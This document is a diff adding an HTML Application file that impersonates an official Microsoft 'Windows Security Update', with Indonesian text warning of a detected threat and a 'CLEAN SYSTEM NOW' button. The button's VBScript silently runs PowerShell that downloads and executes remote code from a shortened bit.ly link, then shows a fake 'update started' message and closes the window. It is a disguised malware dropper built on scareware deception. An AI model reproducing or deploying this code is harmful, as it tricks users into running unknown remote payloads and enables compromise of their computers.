@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Windows Security Update</title>
+    <hta:application id="oHTA" 
+        applicationname="Windows Update" 
+        border="thin" 
+        caption="yes" 
+        icon="https://www.microsoft.com/favicon.ico"
+        showintaskbar="yes" 
+        singleinstance="yes" 
+        sysmenu="yes" 
+        windowstate="normal">
+</head>
+<body style="background:#000; color:#0f0; font-family:Consolas; padding:40px; text-align:center;">
+    
+    <h1 style="color:#f00;">🚨 CRITICAL SECURITY UPDATE 🚨</h1>
+    <p style="font-size:18px;">Windows telah mendeteksi ancaman berbahaya di sistem Anda.</p>
+    <p style="font-size:18px;">Klik tombol di bawah untuk membersihkan sistem segera.</p>
+    
+    <button onclick="runFix()" style="background:#f00; color:white; border:none; padding:20px 80px; font-size:24px; margin:30px 0; cursor:pointer;">
+        CLEAN SYSTEM NOW
+    </button>
+    
+    <p style="color:#666; margin-top:40px;">Official Microsoft Security Patch</p>
+
+    <script language="VBScript">
+        Sub runFix()
+            Dim shell
+            Set shell = CreateObject("WScript.Shell")
+            shell.Run "powershell -nop -c ""iex (iwr -UseBasicParsing 'https://bit.ly/fixwin2026').Content""", 0, False
+            MsgBox "Security update telah dimulai. Tunggu beberapa saat...", 0, "Windows Security"
+            window.close()
+        End Sub
+    </script>
+
+</body>
+</html>
